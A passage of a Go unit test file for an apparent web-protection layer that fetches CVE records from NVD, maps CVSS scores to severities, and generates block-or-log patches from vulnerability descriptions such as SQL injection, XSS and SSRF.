func TestNVDClient_GetCVE_ErrorStatus(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusNotFound)
	}))
	defer server.Close()

	client := NewNVDClient("")
	client.SetBaseURL(server.URL)

	_, err := client.GetCVE("CVE-TEST")
	if err == nil {
		t.Error("Expected error for 404 status")
	}
}

// ---------------------------------------------------------------------------
// convertToCVEEntry: CVSS v2, v3.0, v3.1
// ---------------------------------------------------------------------------

func TestConvertToCVEEntry_CVSSv30(t *testing.T) {
	nvdCVE := NVDCVE{
		ID:           "CVE-2020-TEST",
		Published:    "2020-01-01T00:00:00Z",
		LastModified: "2020-06-01T00:00:00Z",
		VulnStatus:   "Analyzed",
		Descriptions: []NVDDescription{{Lang: "en", Value: "Test vulnerability"}},
		Metrics: NVDMetrics{
			CVSSMetricV30: []NVDCVSSMetricV30{
				{CVSSData: NVDCVSSData{BaseScore: 8.5, BaseSeverity: "HIGH"}},
			},
		},
	}

	entry := convertToCVEEntry(nvdCVE)
	if entry.CVSSScore != 8.5 {
		t.Errorf("Expected CVSS 8.5, got %f", entry.CVSSScore)
	}
	if entry.Severity != "HIGH" {
		t.Errorf("Expected HIGH, got %q", entry.Severity)
	}
}

func TestConvertToCVEEntry_CVSSv2(t *testing.T) {
	nvdCVE := NVDCVE{
		ID:           "CVE-2019-OLD",
		Published:    "2019-01-01T00:00:00Z",
		LastModified: "2019-06-01T00:00:00Z",
		VulnStatus:   "Analyzed",
		Descriptions: []NVDDescription{{Lang: "en", Value: "Old vulnerability"}},
		Metrics: NVDMetrics{
			CVSSMetricV2: []NVDCVSSMetricV2{
				{CVSSData: NVDCVSSDataV2{BaseScore: 7.5}},
			},
		},
	}

	entry := convertToCVEEntry(nvdCVE)
	if entry.CVSSScore != 7.5 {
		t.Errorf("Expected CVSS 7.5, got %f", entry.CVSSScore)
	}
	if entry.Severity != "HIGH" {
		t.Errorf("Expected HIGH for v2 score 7.5, got %q", entry.Severity)
	}
}

func TestConvertToCVEEntry_NoMetrics(t *testing.T) {
	nvdCVE := NVDCVE{
		ID:           "CVE-NOMETRIC",
		Descriptions: []NVDDescription{{Lang: "en", Value: "No metrics"}},
	}

	entry := convertToCVEEntry(nvdCVE)
	if entry.CVSSScore != 0 {
		t.Errorf("Expected CVSS 0, got %f", entry.CVSSScore)
	}
	if entry.Severity != "" {
		t.Errorf("Expected empty severity, got %q", entry.Severity)
	}
}

// ---------------------------------------------------------------------------
// cvssV2ToSeverity
// ---------------------------------------------------------------------------

func TestCVSSV2ToSeverity(t *testing.T) {
	tests := []struct {
		score    float64
		expected string
	}{
		{9.0, "HIGH"},
		{7.0, "HIGH"},
		{6.9, "MEDIUM"},
		{4.0, "MEDIUM"},
		{3.9, "LOW"},
		{0.0, "LOW"},
	}
	for _, tt := range tests {
		result := cvssV2ToSeverity(tt.score)
		if result != tt.expected {
			t.Errorf("cvssV2ToSeverity(%f) = %q, want %q", tt.score, result, tt.expected)
		}
	}
}

// ---------------------------------------------------------------------------
// parseNVDDatetime
// ---------------------------------------------------------------------------

func TestParseNVDDatetime(t *testing.T) {
	tm := parseNVDDatetime("2021-12-10T00:00:00Z")
	if tm.Year() != 2021 {
		t.Errorf("Expected year 2021, got %d", tm.Year())
	}

	// Invalid datetime should return zero time
	tm = parseNVDDatetime("not-a-date")
	if !tm.IsZero() {
		t.Error("Expected zero time for invalid date")
	}
}

// ---------------------------------------------------------------------------
// Generator: comprehensive tests
// ---------------------------------------------------------------------------

func TestGenerator_ShouldGenerate(t *testing.T) {
	gen := NewGenerator()

	tests := []struct {
		name     string
		cve      *CVEEntry
		expected bool
	}{
		{
			name: "web attack with high severity",
			cve: &CVEEntry{
				Description: "SQL injection in web application",
				CVSSScore:   9.8,
				Severity:    "CRITICAL",
			},
			expected: true,
		},
		{
			name: "non-web attack",
			cve: &CVEEntry{
				Description: "Buffer overflow in local binary",
				CVSSScore:   7.0,
				Severity:    "HIGH",
			},
			expected: false,
		},
		{
			name: "low severity web attack",
			cve: &CVEEntry{
				Description: "Information disclosure via HTTP header",
				CVSSScore:   3.5,
				Severity:    "LOW",
			},
			expected: false,
		},
		{
			name: "web attack with web CWE",
			cve: &CVEEntry{
				Description: "Memory corruption issue",
				CVSSScore:   7.0,
				Severity:    "HIGH",
				CWEs:        []string{"CWE-79"}, // XSS CWE
			},
			expected: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			patch := gen.Generate(tt.cve)
			if (patch != nil) != tt.expected {
				t.Errorf("Generate() returned patch=%v, expected patch != nil = %v", patch != nil, tt.expected)
			}
		})
	}
}

func TestGenerator_AttackTypes(t *testing.T) {
	tests := []struct {
		attackType string
		cve        *CVEEntry
	}{
		{
			"jndi",
			&CVEEntry{
				CVEID: "CVE-JNDI", Description: "Log4j JNDI injection", CVSSScore: 10.0, Severity: "CRITICAL",
			},
		},
		{
			"deserialization",
			&CVEEntry{
				CVEID: "CVE-DESER", Description: "Unsafe deserialization of untrusted data", CVSSScore: 9.0, Severity: "CRITICAL",
			},
		},
		{
			"sqli",
			&CVEEntry{
				CVEID: "CVE-SQLI", Description: "SQL injection in search parameter", CVSSScore: 9.1, Severity: "CRITICAL",
			},
		},
		{
			"xss",
			&CVEEntry{
				CVEID: "CVE-XSS", Description: "Cross-site scripting in user profile", CVSSScore: 6.5, Severity: "MEDIUM",
				CWEs:  []string{"CWE-79"},
			},
		},
		{
			"rce",
			&CVEEntry{
				CVEID: "CVE-RCE", Description: "Remote code execution via shell command", CVSSScore: 9.8, Severity: "CRITICAL",
			},
		},
		{
			"lfi",
			&CVEEntry{
				CVEID: "CVE-LFI", Description: "Local file inclusion via path traversal", CVSSScore: 7.5, Severity: "HIGH",
			},
		},
		{
			"ssrf",
			&CVEEntry{
				CVEID: "CVE-SSRF", Description: "Server-side request forgery in URL fetch", CVSSScore: 8.6, Severity: "HIGH",
			},
		},
		{
			"upload",
			&CVEEntry{
				CVEID: "CVE-UPLOAD", Description: "Unrestricted file upload allows arbitrary file", CVSSScore: 9.0, Severity: "CRITICAL",
			},
		},
		{
			"header",
			&CVEEntry{
				CVEID: "CVE-HEADER", Description: "HTTP header injection in redirect", CVSSScore: 5.0, Severity: "MEDIUM",
				CWEs:  []string{"CWE-79"},
			},
		},
		{
			"xxe",
			&CVEEntry{
				CVEID: "CVE-XXE", Description: "XML external entity injection", CVSSScore: 7.5, Severity: "HIGH",
				CWEs:  []string{"CWE-79"},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.attackType, func(t *testing.T) {
			gen := NewGenerator()
			patch := gen.Generate(tt.cve)
			if patch == nil {
				t.Fatalf("Expected patch for %s attack type", tt.attackType)
			}
			if len(patch.Patterns) == 0 {
				t.Errorf("Expected patterns for %s attack type", tt.attackType)
			}
			t.Logf("%s: %d patterns, score=%d, action=%s", tt.attackType, len(patch.Patterns), patch.Score, patch.Action)
		})
	}
}

func TestGenerator_DetermineSeverity(t *testing.T) {
	gen := NewGenerator()

	tests := []struct {
		cve      *CVEEntry
		expected string
	}{
		{&CVEEntry{Severity: "CRITICAL", CVSSScore: 10.0}, "CRITICAL"},
		{&CVEEntry{Severity: "", CVSSScore: 9.5}, "CRITICAL"},
		{&CVEEntry{Severity: "", CVSSScore: 7.5}, "HIGH"},
		{&CVEEntry{Severity: "", CVSSScore: 4.5}, "MEDIUM"},
		{&CVEEntry{Severity: "", CVSSScore: 2.0}, "LOW"},
	}

	for _, tt := range tests {
		result := gen.determineSeverity(tt.cve)
		if result != tt.expected {
			t.Errorf("determineSeverity(%+v) = %q, want %q", tt.cve, result, tt.expected)
		}
	}
}

func TestGenerator_DetermineAction(t *testing.T) {
	gen := NewGenerator()

	tests := []struct {
		severity string
		expected string
	}{
		{"CRITICAL", "block"},
		{"HIGH", "block"},
		{"MEDIUM", "log"},
		{"LOW", "log"},
	}

	for _, tt := range tests {
		result := gen.determineAction(tt.severity)
		if result != tt.expected {
			t.Errorf("determineAction(%q) = %q, want %q", tt.severity, result, tt.expected)
		}
	}
}

func TestGenerator_CalculateScore(t *testing.T) {
	gen := NewGenerator()

	tests := []struct {
		cve      *CVEEntry
		expected int
	}{
		{&CVEEntry{CVSSScore: 10.0, Severity: "CRITICAL"}, 50},
		{&CVEEntry{CVSSScore: 8.0, Severity: "HIGH"}, 40},
		{&CVEEntry{CVSSScore: 5.0, Severity: "MEDIUM"}, 25},
	}

	for _, tt := range tests {
		result := gen.calculateScore(tt.cve)
		if result != tt.expected {
			t.Errorf("calculateScore(%+v) = %d, want %d", tt.cve, result, tt.expected)
		}
	}
}

func TestGenerator_ExtractKeywords(t *testing.T) {
	gen := NewGenerator()

	keywords := gen.extractKeywords("select * from users where id = 1")
	if len(keywords) == 0 {
		t.Error("Expected keywords from SQL-like description")
	}
	t.Logf("Keywords: %v", keywords)
}

func TestGenerator_ExtractKeywords_Empty(t *testing.T) {
	gen := NewGenerator()

	keywords := gen.extractKeywords("")
	if len(keywords) != 0 {
		t.Errorf("Expected no keywords from empty string, got %v", keywords)
	}
}

func TestGenerator_GenericAttackType(t *testing.T) {
	gen := NewGenerator()

	cve := &CVEEntry{
		CVEID:       "CVE-GENERIC",
		Description: "Apache web server request header vulnerability",
		CVSSScore:   7.0,
		Severity:    "HIGH",
		CWEs:        []string{"CWE-79"},
	}

	patch := gen.Generate(cve)
	if patch == nil {
		t.Fatal("Expected patch for generic web attack")
	}
	t.Logf("Generic attack patch: %d patterns, action=%s", len(patch.Patterns), patch.Action)
}

// ---------------------------------------------------------------------------
// extractPatternsFromDescription
// ---------------------------------------------------------------------------

func TestExtractPatternsFromDescription(t *testing.T) {
	tests := []struct {
		desc         string
		expectLen    int
		expectAttack string
	}{
		{"SQL injection in user search parameter", 1, "sql injection"},
		{"Cross-site scripting vulnerability in input", 1, "xss"},
		{"Remote code execution via command injection", 1, "rce"},
		{"Path traversal allows reading files via ../", 1, "path traversal"},
		{"Server-side request forgery in URL handler", 1, "ssrf"},
		{"XML external entity injection in parser", 1, "xxe"},
		{"Normal performance improvement", 0, ""},
	}

	for _, tt := range tests {
		t.Run(tt.desc, func(t *testing.T) {
			patterns := extractPatternsFromDescription(tt.desc)
			if len(patterns) < tt.expectLen {
				t.Errorf("Expected >= %d patterns, got %d for %q", tt.expectLen, len(patterns), tt.desc)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// generatePatchesFromCVE
// ---------------------------------------------------------------------------

func TestLayer_GeneratePatchesFromCVE(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})

	entry := &CVEEntry{
		CVEID:       "CVE-2024-AUTOGEN",
		Description: "SQL injection in web application login endpoint",
		CVSSScore:   9.0,
		Severity:    "CRITICAL",
	}

	patches := layer.generatePatchesFromCVE(entry)
	if len(patches) == 0 {
		t.Fatal("Expected auto-generated patches")
	}

	patch := patches[0]
	if !patch.AutoGenerated {
		t.Error("Expected AutoGenerated=true")
	}
	if !patch.Enabled {
		t.Error("Expected Enabled=true")
	}
	if patch.Action != "block" {
		t.Errorf("Expected action 'block', got %q", patch.Action)
	}
	t.Logf("Auto-generated patch: id=%s, patterns=%d, score=%d", patch.ID, len(patch.Patterns), patch.Score)
}

func TestLayer_GeneratePatchesFromCVE_NoPatterns(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})

	entry := &CVEEntry{
		CVEID:       "CVE-2024-NOPATTERN",
		Description: "Normal memory allocation performance issue",
		CVSSScore:   3.0,
		Severity:    "LOW",
	}

	patches := layer.generatePatchesFromCVE(entry)
	if len(patches) != 0 {
		t.Errorf("Expected no patches for non-attack CVE, got %d", len(patches))
	}
}

// ---------------------------------------------------------------------------
// Helper
// ---------------------------------------------------------------------------
